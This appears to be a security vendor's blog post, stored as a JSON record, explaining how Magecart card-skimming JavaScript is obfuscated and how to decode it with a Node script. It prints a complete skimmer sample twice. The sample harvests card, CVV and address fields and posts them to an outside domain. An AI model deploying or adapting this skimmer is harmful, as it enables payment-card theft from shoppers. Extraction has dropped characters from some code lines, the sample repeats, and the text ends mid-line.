{
    "id": "e6d3262a-1bf3-4cb7-acc9-55f5314a38c6",
    "created_at": "2023-01-12T15:04:56.449116Z",
    "updated_at": "2025-03-27T02:10:49.412068Z",
    "deleted_at": null,
    "sha1_hash": "28f851701af2a39688dc59934697a6b8615093d9",
    "title": "2020-01-15 - Analyzing Magecart Malware – From Zero to Hero",
    "authors": "",
    "file_creation_date": "2022-05-27T21:16:37Z",
    "file_modification_date": "2022-05-27T21:16:37Z",
    "file_size": 2748513,
    "plain_text": "# Analyzing Magecart Malware – From Zero to Hero\n\n**[perimeterx.com/blog/analyzing_magecart_malware_from_zero_to_hero/](https://www.perimeterx.com/blog/analyzing_magecart_malware_from_zero_to_hero/)**\n\nBy Guy Bary\n\n#### TL;DR\n\n Javascript obfuscation is not a new trend, but it is widely used today to hide malware code in many websites. This post is for technical readers who want to understand Magecart's common obfuscation pattern, and ways to decode it.\n\n As websites get more and more complex, we see an increasing number of sites that are being compromised by malicious code injections, also commonly known as Magecart or digital skimming attacks. These attacks are designed to steal user data such as credit card numbers from websites, and if left unchecked, can result in significant data breaches and huge fines for the website owner.\n\n Magecart attacks often go unnoticed for weeks, months or even years. One reason that they escape scrutiny is that the injected JavaScript code is heavily obfuscated, making it hard to detect malicious script actions and data leaking to unauthorized domains. However, a significant number of these obfuscated scripts seem to share a pattern.\n\n Obfuscation\n\n “the action of making something less clear and less easy to understand, especially intentionally” - Cambridge Dictionary\n\n Take a look at this Magecart attack sample. This code steals credit card details from users and this sample is from an ongoing attack.\n\n\n-----\n\n```\nvar _0x34d5 [\n \"Q29udGVudC1UeXBl\",\n \"YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVk\",\n \"c2V0UHVibGljS2V5\",\n\"TUlJRUlqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0JBOEFNSUlFQ2dLQ0JBRUF3NTZoY3Z1R25QZHZaM0hGQWtLN\n \"ZW5jcnlwdA==\",\n \"c2VuZA==\",\n \"cGxhY2Vfb3JkZXI=\",\n \"cGxhY2Utb3JkZXI=\",\n \"cGF5bWVudC1idXR0b25zLWNvbnRhaW5lcg==\",\n \"YmlsbGluZy1idXR0b25zLWNvbnRhaW5lcg==\",\n \"cmV2aWV3LWJ1dHRvbnMtY29udGFpbmVy\",\n \"bGVuZ3Ro\",\n \"W2lkKj0n\",\n \"cXVlcnlTZWxlY3RvckFsbA==\",\n \"YWRkRXZlbnRMaXN0ZW5lcg==\",\n \"Y2xpY2s=\",\n \"YnRuLWNoZWNrb3V0\",\n \"W2NsYXNzKj0n\",\n \"bG9hZA==\",\n \"aG9zdG5hbWU=\",\n \"bG9jYXRpb24=\",\n \"aW5wdXQ=\",\n \"aW5kZXhPZg==\",\n \"X2NjX251bWJlcg==\",\n \"c3Vic3Ry\",\n \"dm1fY2NfbnVtYmVy\",\n \"Z2V0RWxlbWVudEJ5SWQ=\",\n \"dmFsdWU=\",\n \"dm1fZXhwaXJhdGlvbg==\",\n \"X2V4cGlyYXRpb24=\",\n \"dm1fZXhwaXJhdGlvbl95cg==\",\n \"X2V4cGlyYXRpb25feXI=\",\n \"dm1fY2NfY2lk\",\n \"X2NjX2NpZA==\",\n \"X2NjX2V4cF9tb250aA==\",\n \"X2NjX2V4cF95ZWFy\",\n \"X2NjX2N2dg==\",\n \"Zmlyc3RuYW1l\",\n \"bGFzdG5hbWU=\",\n \"ZW1haWw=\",\n \"c3RyZWV0MQ==\",\n \"c3RyZWV0Mg==\",\n \"Y2l0eQ==\",\n \"cmVnaW9uX2lk\",\n \"Y291bnRyeV9pZA==\",\n \"cG9zdGNvZGU=\",\n \"dGVsZXBob25l\",\n \"YmlsbGluZzo=\",\n \"c3RyaW5naWZ5\",\n \"dHBzOi8vbGlnaHRnZXRqcy5jb20=\",\n \"b3Blbg==\",\n \"UE9TVA==\",\n\n```\n\n-----\n\n```\n c2V0UmVxdWVzdEhlYWRlcg,\n];\n(function(_0x110cd2, _0xa263bd) {\n var _0x352891 = function(_0x76a704) {\n  while (--_0x76a704) {\n   _0x110cd2[\"push\"](_0x110cd2[\"shift\"]());\n  }\n };\n _0x352891(++_0xa263bd);\n})(_0x34d5, 0xa5);\nvar _0x47fb = function(_0x522b23, _0x4fa39c) {\n _0x522b23 = _0x522b23 - 0x0;\n var _0xdb42df = _0x34d5[_0x522b23];\n if (_0x47fb[\"IyfmVK\"] === undefined) {\n  (function() {\n   var _0x28a5cc = function() {\n    var _0x3f5c15;\n    try {\n     _0x3f5c15 = Function(\"return\\x20(function()\\x20\" + \"\n{}.constructor(\\x22return\\x20this\\x22)(\\x20)\" + \");\")();\n    } catch (_0x7f7a59) {\n     _0x3f5c15 = window;\n    }\n    return _0x3f5c15;\n   };\n   var _0x1a2269 = _0x28a5cc();\n   var _0x2009de =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n   _0x1a2269[\"atob\"] ||\n    (_0x1a2269[\"atob\"] = function(_0x2633f6) {\n     var _0x1bf8c8 = String(_0x2633f6)[\"replace\"](/=+$/, \"\");\n     for (\n      var _0x4e57f1 = 0x0, _0x5122c7, _0x5cb7d8, _0x2540b4 = 0x0, _0x140365 =\n\"\";\n      (_0x5cb7d8 = _0x1bf8c8[\"charAt\"](_0x2540b4++));\n      ~_0x5cb7d8 && ((_0x5122c7 = _0x4e57f1 % 0x4 ? _0x5122c7 * 0x40 +\n_0x5cb7d8 : _0x5cb7d8), _0x4e57f1++ % 0x4)\n       ? (_0x140365 += String[\"fromCharCode\"](0xff & (_0x5122c7 >> ((-0x2 *\n_0x4e57f1) & 0x6))))\n       : 0x0\n     ) {\n      _0x5cb7d8 = _0x2009de[\"indexOf\"](_0x5cb7d8);\n     }\n     return _0x140365;\n    });\n  })();\n  _0x47fb[\"cJuRna\"] = function(_0x55fba5) {\n   var _0xfd7af3 = atob(_0x55fba5);\n   var _0x953b7b = [];\n   for (var _0x192361 = 0x0, _0x1f2b27 = _0xfd7af3[\"length\"]; _0x192361 <\n_0x1f2b27; _0x192361++) {\n    _0x953b7b += \"%\" + (\"00\" + _0xfd7af3[\"charCodeAt\"](_0x192361)[\"toString\"]\n(0x10))[\"slice\"](-0x2);\n   }\n   return decodeURIComponent(_0x953b7b);\n\n```\n\n-----\n\n```\n  };\n  _0x47fb[\"naGzua\"] = {};\n  _0x47fb[\"IyfmVK\"] = !![];\n }\n var _0x11ff5c = _0x47fb[\"naGzua\"][_0x522b23];\n if (_0x11ff5c === undefined) {\n  _0xdb42df = _0x47fb[\"cJuRna\"](_0xdb42df);\n  _0x47fb[\"naGzua\"][_0x522b23] = _0xdb42df;\n } else {\n  _0xdb42df = _0x11ff5c;\n }\n return _0xdb42df;\n};\nfunction readyr() {\n try {\n  var _0x5bbf66 = [_0x47fb(\"0x0\"), _0x47fb(\"0x1\"), _0x47fb(\"0x2\"), _0x47fb(\"0x3\"),\n_0x47fb(\"0x4\")];\n  var _0x8475c0 = _0x5bbf66[_0x47fb(\"0x5\")];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = _0x47fb(\"0x6\") + f + \"\\x27]\";\n    var _0x7ddc45 = document[_0x47fb(\"0x7\")](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[_0x47fb(\"0x5\")]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][_0x47fb(\"0x8\")](_0x47fb(\"0x9\"), bts);\n    }\n   } catch (_0x375bef) {}\n  }\n } catch (_0x36add6) {}\n try {\n  var _0x5bbf66 = [_0x47fb(\"0xa\")];\n  var _0x8475c0 = _0x5bbf66[_0x47fb(\"0x5\")];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = _0x47fb(\"0xb\") + f + \"\\x27]\";\n    var _0x7ddc45 = document[_0x47fb(\"0x7\")](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[_0x47fb(\"0x5\")]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][_0x47fb(\"0x8\")](_0x47fb(\"0x9\"), bts);\n    }\n   } catch (_0x24b4f5) {}\n  }\n } catch (_0x196a93) {}\n}\nwindow[_0x47fb(\"0x8\")](_0x47fb(\"0xc\"), readyr);\nsetInterval(bts, 0x7d0);\nvar vvk = \"\";\nfunction bts() {\n try {\n  var _0x34f9e9 = {};\n\n```\n\n-----\n\n```\n  _0x34f9e9[_0x47fb( 0xd )] window[_0x47fb( 0xe )][_0x47fb( 0xd )];\n  var _0x4a60b2 = document[_0x47fb(\"0x7\")](_0x47fb(\"0xf\"));\n  var _0x570cfd = _0x4a60b2[_0x47fb(\"0x5\")];\n  var _0x57a5b3 = \"\";\n  for (var _0x1e5f96 = 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   el = _0x4a60b2[_0x1e5f96][\"id\"];\n   pos = el[_0x47fb(\"0x10\")](_0x47fb(\"0x11\"));\n   if (pos > 0x0) {\n    _0x57a5b3 = el[_0x47fb(\"0x12\")](0x0, pos);\n   }\n  }\n  if (!_0x57a5b3) return;\n  var _0x553440 = _0x57a5b3;\n  try {\n   _0x34f9e9[_0x47fb(\"0x13\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x11\"))[_0x47fb(\"0x15\")];\n  } catch (_0x1f7150) {}\n  if (!_0x34f9e9[_0x47fb(\"0x13\")]) return;\n  try {\n   _0x34f9e9[_0x47fb(\"0x16\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x17\"))[_0x47fb(\"0x15\")];\n  } catch (_0x136215) {}\n  try {\n   _0x34f9e9[_0x47fb(\"0x18\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x19\"))[_0x47fb(\"0x15\")];\n  } catch (_0x4ab22b) {}\n  try {\n   _0x34f9e9[_0x47fb(\"0x1a\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1b\"))[_0x47fb(\"0x15\")];\n  } catch (_0x4df1f0) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x16\")]) {\n    _0x34f9e9[_0x47fb(\"0x16\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1c\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x90cd50) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x18\")]) {\n    _0x34f9e9[_0x47fb(\"0x18\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1d\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x188c28) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x1a\")]) {\n    _0x34f9e9[_0x47fb(\"0x1a\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1e\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x32a59b) {}\n  var _0x1e9e38 = 0x0;\n  if (_0x34f9e9[_0x47fb(\"0x13\")][_0x47fb(\"0x5\")] == 0xf &&\n_0x34f9e9[_0x47fb(\"0x1a\")][_0x47fb(\"0x5\")] > 0x3)\n   _0x1e9e38 = 0x1;\n  if (_0x34f9e9[_0x47fb(\"0x13\")][_0x47fb(\"0x5\")] > 0xf &&\n_0x34f9e9[_0x47fb(\"0x1a\")][_0x47fb(\"0x5\")] >= 0x3)\n   _0x1e9e38 = 0x1;\n\n```\n\n-----\n\n```\n  if (!_0x1e9e38) return;\n  var _0xe078a8 = [\n   _0x47fb(\"0x1f\"),\n   _0x47fb(\"0x20\"),\n   _0x47fb(\"0x21\"),\n   _0x47fb(\"0x22\"),\n   _0x47fb(\"0x23\"),\n   _0x47fb(\"0x24\"),\n   _0x47fb(\"0x25\"),\n   _0x47fb(\"0x26\"),\n   _0x47fb(\"0x27\"),\n   _0x47fb(\"0x28\"),\n  ];\n  _0x570cfd = _0xe078a8[_0x47fb(\"0x5\")];\n  for (var _0x1e5f96 = 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   _0x553440 = _0xe078a8[_0x1e5f96];\n   k = _0x47fb(\"0x29\") + _0x553440;\n   try {\n    _0x34f9e9[_0x553440] = document[_0x47fb(\"0x14\")](k)[_0x47fb(\"0x15\")];\n   } catch (_0x12e01e) {}\n  }\n  if (!_0x34f9e9[_0x47fb(\"0x27\")]) return;\n  if (_0x1e9e38) {\n   _0x34f9e9 = JSON[_0x47fb(\"0x2a\")](_0x34f9e9);\n   if (_0x34f9e9[_0x47fb(\"0x5\")] == vvk[_0x47fb(\"0x5\")]) return;\n   vvk = _0x34f9e9;\n   var _0x4c73bd = new XMLHttpRequest();\n   url = \"ht\" + _0x47fb(\"0x2b\");\n   _0x4c73bd[_0x47fb(\"0x2c\")](_0x47fb(\"0x2d\"), url + \"\", ![]);\n   _0x4c73bd[_0x47fb(\"0x2e\")](_0x47fb(\"0x2f\"), _0x47fb(\"0x30\"));\n   var _0xd96713 = new JSEncrypt();\n   _0xd96713[_0x47fb(\"0x31\")](_0x47fb(\"0x32\"));\n   var _0x5dc551 = _0xd96713[_0x47fb(\"0x33\")](_0x34f9e9);\n   _0x4c73bd[_0x47fb(\"0x34\")](\"k=\" + _0x5dc551);\n  }\n } catch (_0x2661d6) {}\n}\n\n#### The obfuscated code doesn’t make a lot of sense at first, but upon closer inspection we can see that it has a structure that repeats across many different Magecart scripts that we have analyzed. It uses two main techniques.\n\n 1.Javascript syntax manipulation\n\n This involves using any number of Javascript language tricks to manipulate data (e.g., using non-decimal values for strings and numbers, randomizing variable names, using chained commas in return statements, etc.)\n\n 2.Common Obfuscation Pattern\n\n This is a common JavaScript obfuscation pattern that we see repeated across many different Magecart attack scripts.\n\n```\n\n-----\n\n#### More Magecart samples:\n\n //cdndeskpro[.]com/mc[.]js //listrakjs[.]com/api[.]js //lightgetjs[.]com/light[.]js\n\n## The Magecart Pattern\n\n#### Magecart code uses a classic obfuscation technique, which is also used by several legitimate obfuscation services. This technique is effective, but once you understand the common pattern, you can de-obfuscate it and uncover the logic.\n\n The pattern contains three layers:\n\n 1. Content Layer a set of data tokens, that requires a decryption step, to become the real\n data values 2. Decryption Layer A function that gets a data key as a parameter (from the Logic layer)\n and gets the corresponding data token from the Content layer. The function decrypts the data token using a dedicated algorithm (e.g window.atob) to retrieve the original data value. 3. Logic Layer The actual malware code. This code gets real the data values for its\n execution by calling the Decryption layer8 with *data keys\\.\n\n Pattern Overview\n\n\n-----\n\n#### Notes\n\n Some obfuscation techniques don't have a Content layer. In such cases, the Decryption layer is parsing data tokens directly from the Logic layer Some obfuscation techniques might have more than one decryption function.\n\n Example:\n\n\n-----\n\n```\n//Content\nconst dataTokens = [\"cGF0dGVybg==\", \"aGVsbG8=\"];\n(function prepareContent(_dataTokens, shiftCount) {\n for (let i = 0; i < shiftCount; i++) {\n  _dataTokens.push(_dataTokens.shift());\n }\n})(dataTokens, 0x1);\n//Decryption\nfunction getRealValue(dataKey) {\n const realValue = atob(dataTokens[dataKey]);\n return realValue;\n}\n//Logic\nrun();\nfunction run() {\n console.log(getRealValue(0x0) + \" \" + getRealValue(0x1)); //\"hello pattern\"\n}\n\n#### Content:\n\n dataTokens - an array of data tokens (cGF0dGVybg==, aGVsbG8=) prepareContent - a function that shifting the array once\n\n Decryption\n\n getString(): a function that gets a data key from the Logic layer, retrieves the correlative data token from the Content layer, and then executes window.atob on the data token to get the real data value.\n\n Logic\n\n Prints “hello pattern” using data keys (0x0, 0x1) getRealValue(0x0) -> “hello” getRealValue(0x1) -> “pattern”\n\n## Magecart Pattern Analysis\n\n#### Now let's analyze the Magecart attack code seen above using this pattern (Content, Decryption, Logic)\n\n Content\n\n \\0x34d5: an array of _data tokens There is a preparation step that is shifting the array 165 times (0xa5 === 165).\n\n```\n\n-----\n\n```\nvar _0x34d5 [\n \"Q29udGVudC1UeXBl\",\n \"YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVk\",\n \"c2V0UHVibGljS2V5\",\n\"TUlJRUlqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0JBOEFNSUlFQ2dLQ0JBRUF3NTZoY3Z1R25QZHZaM0hGQWtLN\n \"ZW5jcnlwdA==\",\n \"c2VuZA==\",\n \"cGxhY2Vfb3JkZXI=\",\n \"cGxhY2Utb3JkZXI=\",\n \"cGF5bWVudC1idXR0b25zLWNvbnRhaW5lcg==\",\n \"YmlsbGluZy1idXR0b25zLWNvbnRhaW5lcg==\",\n \"cmV2aWV3LWJ1dHRvbnMtY29udGFpbmVy\",\n \"bGVuZ3Ro\",\n \"W2lkKj0n\",\n \"cXVlcnlTZWxlY3RvckFsbA==\",\n \"YWRkRXZlbnRMaXN0ZW5lcg==\",\n \"Y2xpY2s=\",\n \"YnRuLWNoZWNrb3V0\",\n \"W2NsYXNzKj0n\",\n \"bG9hZA==\",\n \"aG9zdG5hbWU=\",\n \"bG9jYXRpb24=\",\n \"aW5wdXQ=\",\n \"aW5kZXhPZg==\",\n \"X2NjX251bWJlcg==\",\n \"c3Vic3Ry\",\n \"dm1fY2NfbnVtYmVy\",\n \"Z2V0RWxlbWVudEJ5SWQ=\",\n \"dmFsdWU=\",\n \"dm1fZXhwaXJhdGlvbg==\",\n \"X2V4cGlyYXRpb24=\",\n \"dm1fZXhwaXJhdGlvbl95cg==\",\n \"X2V4cGlyYXRpb25feXI=\",\n \"dm1fY2NfY2lk\",\n \"X2NjX2NpZA==\",\n \"X2NjX2V4cF9tb250aA==\",\n \"X2NjX2V4cF95ZWFy\",\n \"X2NjX2N2dg==\",\n \"Zmlyc3RuYW1l\",\n \"bGFzdG5hbWU=\",\n \"ZW1haWw=\",\n \"c3RyZWV0MQ==\",\n \"c3RyZWV0Mg==\",\n \"Y2l0eQ==\",\n \"cmVnaW9uX2lk\",\n \"Y291bnRyeV9pZA==\",\n \"cG9zdGNvZGU=\",\n \"dGVsZXBob25l\",\n \"YmlsbGluZzo=\",\n \"c3RyaW5naWZ5\",\n \"dHBzOi8vbGlnaHRnZXRqcy5jb20=\",\n \"b3Blbg==\",\n \"UE9TVA==\",\n\n```\n\n-----\n\n```\n c2V0UmVxdWVzdEhlYWRlcg,\n];\n(function(_0x110cd2, _0xa263bd) {\n var _0x352891 = function(_0x76a704) {\n  while (--_0x76a704) {\n   _0x110cd2[\"push\"](_0x110cd2[\"shift\"]());\n  }\n };\n _0x352891(++_0xa263bd);\n})(_0x34d5, 0xa5);\n\n#### Decryption\n\n \\0x47fb: a decryption function. in this case the decryption algorithm is a simple _atob function (base64 decoding). \\0x522b23: _data key \\0xdb42df: _data token\n\n```\n\n-----\n\n```\nvar _0x47fb function(_0x522b23, _0x4fa39c) {\n _0x522b23 = _0x522b23 - 0x0;\n var _0xdb42df = _0x34d5[_0x522b23];\n if (_0x47fb[\"IyfmVK\"] === undefined) {\n  (function() {\n   var _0x28a5cc = function() {\n    var _0x3f5c15;\n    try {\n     _0x3f5c15 = Function(\"return\\x20(function()\\x20\" + \"\n{}.constructor(\\x22return\\x20this\\x22)(\\x20)\" + \");\")();\n    } catch (_0x7f7a59) {\n     _0x3f5c15 = window;\n    }\n    return _0x3f5c15;\n   };\n   var _0x1a2269 = _0x28a5cc();\n   var _0x2009de =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n   _0x1a2269[\"atob\"] ||\n    (_0x1a2269[\"atob\"] = function(_0x2633f6) {\n     var _0x1bf8c8 = String(_0x2633f6)[\"replace\"](/=+$/, \"\");\n     for (\n      var _0x4e57f1 = 0x0, _0x5122c7, _0x5cb7d8, _0x2540b4 = 0x0, _0x140365 =\n\"\";\n      (_0x5cb7d8 = _0x1bf8c8[\"charAt\"](_0x2540b4++));\n      ~_0x5cb7d8 && ((_0x5122c7 = _0x4e57f1 % 0x4 ? _0x5122c7 * 0x40 +\n_0x5cb7d8 : _0x5cb7d8), _0x4e57f1++ % 0x4)\n       ? (_0x140365 += String[\"fromCharCode\"](0xff & (_0x5122c7 >> ((-0x2 *\n_0x4e57f1) & 0x6))))\n       : 0x0\n     ) {\n      _0x5cb7d8 = _0x2009de[\"indexOf\"](_0x5cb7d8);\n     }\n     return _0x140365;\n    });\n  })();\n  _0x47fb[\"cJuRna\"] = function(_0x55fba5) {\n   var _0xfd7af3 = atob(_0x55fba5);\n   var _0x953b7b = [];\n   for (var _0x192361 = 0x0, _0x1f2b27 = _0xfd7af3[\"length\"]; _0x192361 <\n_0x1f2b27; _0x192361++) {\n    _0x953b7b += \"%\" + (\"00\" + _0xfd7af3[\"charCodeAt\"](_0x192361)[\"toString\"]\n(0x10))[\"slice\"](-0x2);\n   }\n   return decodeURIComponent(_0x953b7b);\n  };\n  _0x47fb[\"naGzua\"] = {};\n  _0x47fb[\"IyfmVK\"] = !![];\n }\n var _0x11ff5c = _0x47fb[\"naGzua\"][_0x522b23];\n if (_0x11ff5c === undefined) {\n  _0xdb42df = _0x47fb[\"cJuRna\"](_0xdb42df);\n  _0x47fb[\"naGzua\"][_0x522b23] = _0xdb42df;\n } else {\n  _0xdb42df = _0x11ff5c;\n\n```\n\n-----\n\n```\n }\n return _0xdb42df;\n};\n\n#### Logic\n\n Execute the main malware part using \\0x47fb_ function to get data values from data key (‘0x0’, ‘0x1’, ‘0x2’...’) Examples:\n\n _0x47fb('0x0'); -> “place_order” _0x47fb('0x7'); -> ”querySelectorAll”\n\n```\n\n-----\n\n```\nfunction readyr() {\n try {\n  var _0x5bbf66 = [_0x47fb(\"0x0\"), _0x47fb(\"0x1\"), _0x47fb(\"0x2\"), _0x47fb(\"0x3\"),\n_0x47fb(\"0x4\")];\n  var _0x8475c0 = _0x5bbf66[_0x47fb(\"0x5\")];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = _0x47fb(\"0x6\") + f + \"\\x27]\";\n    var _0x7ddc45 = document[_0x47fb(\"0x7\")](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[_0x47fb(\"0x5\")]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][_0x47fb(\"0x8\")](_0x47fb(\"0x9\"), bts);\n    }\n   } catch (_0x375bef) {}\n  }\n } catch (_0x36add6) {}\n try {\n  var _0x5bbf66 = [_0x47fb(\"0xa\")];\n  var _0x8475c0 = _0x5bbf66[_0x47fb(\"0x5\")];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = _0x47fb(\"0xb\") + f + \"\\x27]\";\n    var _0x7ddc45 = document[_0x47fb(\"0x7\")](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[_0x47fb(\"0x5\")]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][_0x47fb(\"0x8\")](_0x47fb(\"0x9\"), bts);\n    }\n   } catch (_0x24b4f5) {}\n  }\n } catch (_0x196a93) {}\n}\nwindow[_0x47fb(\"0x8\")](_0x47fb(\"0xc\"), readyr);\nsetInterval(bts, 0x7d0);\nvar vvk = \"\";\nfunction bts() {\n try {\n  var _0x34f9e9 = {};\n  _0x34f9e9[_0x47fb(\"0xd\")] = window[_0x47fb(\"0xe\")][_0x47fb(\"0xd\")];\n  var _0x4a60b2 = document[_0x47fb(\"0x7\")](_0x47fb(\"0xf\"));\n  var _0x570cfd = _0x4a60b2[_0x47fb(\"0x5\")];\n  var _0x57a5b3 = \"\";\n  for (var _0x1e5f96 = 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   el = _0x4a60b2[_0x1e5f96][\"id\"];\n   pos = el[_0x47fb(\"0x10\")](_0x47fb(\"0x11\"));\n   if (pos > 0x0) {\n    _0x57a5b3 = el[_0x47fb(\"0x12\")](0x0, pos);\n   }\n  }\n  if (!_0x57a5b3) return;\n  var _0x553440 = _0x57a5b3;\n  try {\n\n```\n\n-----\n\n```\n   _0x34f9e9[_0x47fb( 0x13 )] document[_0x47fb( 0x14 )](_0x553440 +\n_0x47fb(\"0x11\"))[_0x47fb(\"0x15\")];\n  } catch (_0x1f7150) {}\n  if (!_0x34f9e9[_0x47fb(\"0x13\")]) return;\n  try {\n   _0x34f9e9[_0x47fb(\"0x16\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x17\"))[_0x47fb(\"0x15\")];\n  } catch (_0x136215) {}\n  try {\n   _0x34f9e9[_0x47fb(\"0x18\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x19\"))[_0x47fb(\"0x15\")];\n  } catch (_0x4ab22b) {}\n  try {\n   _0x34f9e9[_0x47fb(\"0x1a\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1b\"))[_0x47fb(\"0x15\")];\n  } catch (_0x4df1f0) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x16\")]) {\n    _0x34f9e9[_0x47fb(\"0x16\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1c\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x90cd50) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x18\")]) {\n    _0x34f9e9[_0x47fb(\"0x18\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1d\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x188c28) {}\n  try {\n   if (!_0x34f9e9[_0x47fb(\"0x1a\")]) {\n    _0x34f9e9[_0x47fb(\"0x1a\")] = document[_0x47fb(\"0x14\")](_0x553440 +\n_0x47fb(\"0x1e\"))[_0x47fb(\"0x15\")];\n   }\n  } catch (_0x32a59b) {}\n  var _0x1e9e38 = 0x0;\n  if (_0x34f9e9[_0x47fb(\"0x13\")][_0x47fb(\"0x5\")] == 0xf &&\n_0x34f9e9[_0x47fb(\"0x1a\")][_0x47fb(\"0x5\")] > 0x3)\n   _0x1e9e38 = 0x1;\n  if (_0x34f9e9[_0x47fb(\"0x13\")][_0x47fb(\"0x5\")] > 0xf &&\n_0x34f9e9[_0x47fb(\"0x1a\")][_0x47fb(\"0x5\")] >= 0x3)\n   _0x1e9e38 = 0x1;\n  if (!_0x1e9e38) return;\n  var _0xe078a8 = [\n   _0x47fb(\"0x1f\"),\n   _0x47fb(\"0x20\"),\n   _0x47fb(\"0x21\"),\n   _0x47fb(\"0x22\"),\n   _0x47fb(\"0x23\"),\n   _0x47fb(\"0x24\"),\n   _0x47fb(\"0x25\"),\n   _0x47fb(\"0x26\"),\n   _0x47fb(\"0x27\"),\n   _0x47fb(\"0x28\"),\n  ];\n  _0x570cfd = _0xe078a8[_0x47fb(\"0x5\")];\n\n```\n\n-----\n\n```\n  for (var _0x1e5f96 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   _0x553440 = _0xe078a8[_0x1e5f96];\n   k = _0x47fb(\"0x29\") + _0x553440;\n   try {\n    _0x34f9e9[_0x553440] = document[_0x47fb(\"0x14\")](k)[_0x47fb(\"0x15\")];\n   } catch (_0x12e01e) {}\n  }\n  if (!_0x34f9e9[_0x47fb(\"0x27\")]) return;\n  if (_0x1e9e38) {\n   _0x34f9e9 = JSON[_0x47fb(\"0x2a\")](_0x34f9e9);\n   if (_0x34f9e9[_0x47fb(\"0x5\")] == vvk[_0x47fb(\"0x5\")]) return;\n   vvk = _0x34f9e9;\n   var _0x4c73bd = new XMLHttpRequest();\n   url = \"ht\" + _0x47fb(\"0x2b\");\n   _0x4c73bd[_0x47fb(\"0x2c\")](_0x47fb(\"0x2d\"), url + \"\", ![]);\n   _0x4c73bd[_0x47fb(\"0x2e\")](_0x47fb(\"0x2f\"), _0x47fb(\"0x30\"));\n   var _0xd96713 = new JSEncrypt();\n   _0xd96713[_0x47fb(\"0x31\")](_0x47fb(\"0x32\"));\n   var _0x5dc551 = _0xd96713[_0x47fb(\"0x33\")](_0x34f9e9);\n   _0x4c73bd[_0x47fb(\"0x34\")](\"k=\" + _0x5dc551);\n  }\n } catch (_0x2661d6) {}\n}\n\n## Magecart Attack De-obfuscation\n\n#### Once you have separated the layers of the malware, you will be able to reveal its code by doing two simple steps:\n\n 1. Execute Content and the Decryption layers in a sandboxed JavaScript environment 2. Evaluate Decryption calls with data keys\n\n You can automate the de-obfuscation procedure and use this node script: Note: This code is a proof-of-concept.\n\n```\n\n-----\n\n```\nconst fs require( fs );\n//In our example DECRYPTION_FUNCTION_NAME === '_0x47fb'\nconst DECRYPTION_FUNCTION_REGEX = new RegExp(`${\"DECRYPTION_FUNCTION_NAME\"}\\\\(.*?\n\\\\)`, \"g\");\n//<Content Code Here>\n//<Parser Code Here>\ndeobfuscateMagecart();\nfunction deobfuscateMagecart() {\n let code = fs.readFileSync(MAGECART_CONTENT_PATH, { encoding: \"utf-8\" });\n let match = DECRYPTION_FUNCTION_REGEX.exec(code);\n do {\n  const decryptionFunctionCall = match[0]; //e.g _0x47fb('0x0')\n  const dataValue = eval(decryptionFunctionCall);\n  //Replace decryption call with evaluated value\n  code = code.replace(decryptionFunctionCall, `\"${dataValue}\"`);\n  match = DECRYPTION_FUNCTION_REGEX.exec(code);\n  DECRYPTION_FUNCTION_REGEX.lastIndex = null;\n } while (match);\n fs.writeFileSync(OUTPUT_PATH, code);\n}\n\n#### This is the output of the automated de-obfuscation script. As you can see, ALL of the strings are revealed, and it is much easier to understand what Magecart actually does.\n\n```\n\n-----\n\n```\nfunction 